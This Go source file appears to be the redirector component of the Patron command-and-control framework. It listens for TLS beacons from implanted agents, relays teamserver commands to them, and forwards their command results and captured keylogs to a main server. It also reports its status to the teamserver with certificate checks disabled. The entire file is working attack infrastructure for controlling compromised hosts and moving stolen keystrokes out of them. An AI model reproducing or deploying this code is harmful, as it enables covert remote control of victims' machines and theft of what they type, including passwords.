package main

import (
	"bytes"
	"crypto/tls"
	"encoding/gob"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"slices"
	"strings"
	"sync"
	"time"

	"github.com/PatronC2/Patron/types"
	"github.com/PatronC2/Patron/lib/logger"
	"github.com/google/uuid"
)

// Forwarder settings
var (
	mainServerIP    = os.Getenv("MAIN_SERVER_IP")
	mainServerPort  = os.Getenv("MAIN_SERVER_PORT")
	forwarderIP     = os.Getenv("FORWARDER_IP")
	forwarderPort   = os.Getenv("FORWARDER_PORT")
	apiIP           = os.Getenv("API_IP")
	apiPort         = os.Getenv("API_PORT")
	linkingKey      = os.Getenv("LINKING_KEY")
	certFile        = "certs/server.pem"
	keyFile         = "certs/server.key"
)

// Map to buffer data by UUID for each client
var commandBuffer sync.Map
var keysBuffer sync.Map

func main() {
	enableLogging := true
	logger.EnableLogging(enableLogging)

	// Set the log file
	logFileName := "logs/forwarder.log"
	err := logger.SetLogFile(logFileName)
	if err != nil {
		fmt.Printf("Error setting log file: %v\n", err)
		return
	}

	// Load TLS certificate for the listener
	cert, err := tls.LoadX509KeyPair(certFile, keyFile)
	if err != nil {
		logger.Logf(logger.Warning, "Failed to load certificate: %v", err)
	}

	// TLS configuration for incoming connections
	tlsConfig := &tls.Config{Certificates: []tls.Certificate{cert}}

	// Start listening on forwarder IP and port
	listener, err := tls.Listen("tcp", forwarderIP+":"+forwarderPort, tlsConfig)
	if err != nil {
		logger.Logf(logger.Warning, "Failed to start listener: %v\n", err)
		return
	}
	defer listener.Close()
	logger.Logf(logger.Info, "Forwarder listening on %s:%s", forwarderIP, forwarderPort)

	go func() {
		for {
			err := sendStatusUpdate()
			if err != nil {
				logger.Logf(logger.Warning, "Error sending status update: %v", err)
			}
			time.Sleep(5 * time.Minute)
		}
	}()

	for {
		conn, err := listener.Accept()
		if err != nil {
			logger.Logf(logger.Warning, "Failed to accept connection: %v\n", err)
			continue
		}
		go handleClientConnection(conn)
	}
}

func sendStatusUpdate() error {
    // Lets the teamserver know this redirector is still online
	url := fmt.Sprintf("https://%s:%s/api/redirector/status", apiIP, apiPort)
	data := map[string]string{
		"linking_key": linkingKey,
	}
	jsonData, err := json.Marshal(data)
	if err != nil {
		return fmt.Errorf("failed to marshal JSON: %w", err)
	}

	req, err := http.NewRequest("PUT", url, bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("failed to create request: %w", err)
	}
	req.Header.Set("Content-Type", "application/json")

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to send request: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("received non-OK response: %s", resp.Status)
	}

	return nil
}

func handleClientConnection(clientConn net.Conn) {
    defer clientConn.Close()

    for {
        mainConn, err := connectToMainServer()
        if err != nil {
            logger.Logf(logger.Warning, "Main server unavailable, retrying in 5 seconds: %v\n", err)
            time.Sleep(5 * time.Second)
            continue
        }
        defer mainConn.Close()

        clientAddr := clientConn.RemoteAddr().String()
        logger.Logf(logger.Info, "Accepted connection from %s\n", clientAddr)

        data := make([]byte, 4096)
        n, err := clientConn.Read(data)
        if err != nil {
            logger.Logf(logger.Warning, "Read error from client %s: %v\n", clientAddr, err)
            return
        }
        clientData := string(data[:n])

        messageParts := strings.Split(clientData, ":")
        if len(messageParts) != 11 {
            logger.Logf(logger.Warning, "Invalid data format from client %s", clientAddr)
            return
        }

        clientUUID := messageParts[0]
        if clientUUID == "" {
            logger.Logf(logger.Warning, "No UUID provided in client data from %s", clientAddr)
            return
        }

        validBeaconTypes := []string{"NoKeysBeacon", "KeysBeacon"}
        beaconType := messageParts[5]
        if !slices.Contains(validBeaconTypes, beaconType) {
            logger.Logf(logger.Warning, "Invalid Beacon Type: %v from %s", beaconType, clientAddr)
            return
        }

        switch beaconType {
        case "NoKeysBeacon":
            

            err = forwardNoKeysBeacon(clientUUID, clientData, mainConn)
            if err != nil {
                logger.Logf(logger.Warning, "Failed to forward to main server for client %s: %v\n", clientUUID, err)
                return
            }

            response, ok := commandBuffer.Load(clientUUID)
            if !ok {
                logger.Logf(logger.Info, "No data available, sending empty response")
                gob.NewEncoder(clientConn).Encode([]byte{})
            } else {
                logger.Logf(logger.Info, "Sending data to client: %v", response)
                gob.NewEncoder(clientConn).Encode(response)
                commandBuffer.Delete(clientUUID)
            }

            result := types.GiveServerResult{}
            dec := gob.NewDecoder(clientConn)
            if err := dec.Decode(&result); err != nil {
                logger.Logf(logger.Warning, "Failed to decode GiveServerResult from client %s: %v\n", clientAddr, err)
                return
            }
            logger.Logf(logger.Info, "Received GiveServerResult from client %s: %v\n", clientAddr, result)
    
            processCommandResult(clientUUID, result, mainConn)
            return
        case "KeysBeacon":
            keysBuffer.Store(clientUUID, clientData)
            err := forwardKeysBeacon(clientUUID, clientData, mainConn)
            if err != nil {
                logger.Logf(logger.Warning, "Failed to forward to main server for client %s: %v\n", clientUUID, err)
                return
            }
            response, ok := keysBuffer.Load(clientUUID)
            if !ok {
                logger.Logf(logger.Info, "No data available, sending empty response")
                gob.NewEncoder(clientConn).Encode([]byte{})
            } else {
                logger.Logf(logger.Info, "Sending data to client: %v", response)
                gob.NewEncoder(clientConn).Encode(response)
                keysBuffer.Delete(clientUUID)
            }

            result := types.KeyReceive{}
            dec := gob.NewDecoder(clientConn)
            if err := dec.Decode(&result); err != nil {
                logger.Logf(logger.Warning, "Failed to decode KeyReceive from client %s: %v\n", clientAddr, err)
                return
            }
            logger.Logf(logger.Info, "Received KeyReceive from client %s: %v\n", clientAddr, result)
            processKeylogs(clientUUID, result, mainConn)
            return
        default:
            logger.Logf(logger.Info, "Unknown beacon type %v", beaconType)
            return
        }
    }
}


// forwardNoKeysBeacon forwards client data to the main server and buffers the server's response
func forwardNoKeysBeacon(clientUUID string, clientData string, mainConn *tls.Conn) error {

    // Send raw client data as a string to the main server
    _, err := mainConn.Write([]byte(clientData))
    if err != nil {
        logger.Logf(logger.Warning, "Failed to send data to main server: %v\n", err)
        return err
    }

    // Decode the server's response into a byte array or a string if expected
    dec := gob.NewDecoder(mainConn)
    var serverResponse types.GiveAgentCommand
    if err := dec.Decode(&serverResponse); err != nil {
        logger.Logf(logger.Warning, "Failed to decode response from main server: %v\n", err)
        return err
    }

    logger.Logf(logger.Info, "Received server response: %v", serverResponse)
    commandBuffer.Store(clientUUID, serverResponse)
    return nil
}

// forwardKeysBeacon forwards client data to the main server returns the server's response
func forwardKeysBeacon(clientUUID string, clientData string, mainConn *tls.Conn) (error) {

    // Send raw client data as a string to the main server
    _, err := mainConn.Write([]byte(clientData))
    if err != nil {
        logger.Logf(logger.Warning, "Failed to send data to main server: %v\n", err)
        return err
    }

    // Decode the server's response into a byte array or a string if expected
    dec := gob.NewDecoder(mainConn)
    var serverResponse types.KeySend
    if err := dec.Decode(&serverResponse); err != nil {
        logger.Logf(logger.Warning, "Failed to decode response from main server: %v\n", err)
        return err
    }

    logger.Logf(logger.Info, "Received server response: %v", serverResponse)
    keysBuffer.Store(clientUUID, serverResponse)
    return nil
}

// processCommandResult processes and forwards the command result to the main server
func processCommandResult(clientUUID string, result types.GiveServerResult, mainConn *tls.Conn) {
    logger.Logf(logger.Debug, "Sending command response: %v", result)

    // Use gob Encoder to send result directly over the connection
    encoder := gob.NewEncoder(mainConn)
    err := encoder.Encode(result)
    if err != nil {
        logger.Logf(logger.Error, "Error sending response: %v", err)
    }
    logger.Logf(logger.Debug, "Sent encoded response")
}

// processKeylogs processes and forwards the keylogs to the main server
func processKeylogs(clientUUID string, keylogs types.KeyReceive, mainConn *tls.Conn) {
    logger.Logf(logger.Debug, "Sending keylogs: %v", keylogs)

    // Use gob Encoder to send keylogs directly over the connection
    encoder := gob.NewEncoder(mainConn)
    err := encoder.Encode(keylogs)
    if err != nil {
        logger.Logf(logger.Error, "Error sending keylogs: %v", err)
    }
    logger.Logf(logger.Debug, "Sent encoded keylogs")
}

// connectToMainServer establishes a TLS connection to the main server
func connectToMainServer() (*tls.Conn, error) {
	cert, err := tls.LoadX509KeyPair(certFile, keyFile)
	if err != nil {
		return nil, fmt.Errorf("failed to load certificate: %w", err)
	}
	tlsConfig := &tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
	return tls.Dial("tcp", mainServerIP+":"+mainServerPort, tlsConfig)
}

// extractUUIDFromData extracts the UUID from the data message for use as the client identifier
func extractUUIDFromData(data []byte) string {
	// Split the data based on delimiter and validate
	parts := strings.Split(string(data), ":")
	if len(parts) > 0 && IsValidUUID(parts[0]) {
		return parts[0]
	}
	return ""
}

func IsValidUUID(u string) bool {
	_, err := uuid.Parse(u)
	return err == nil
}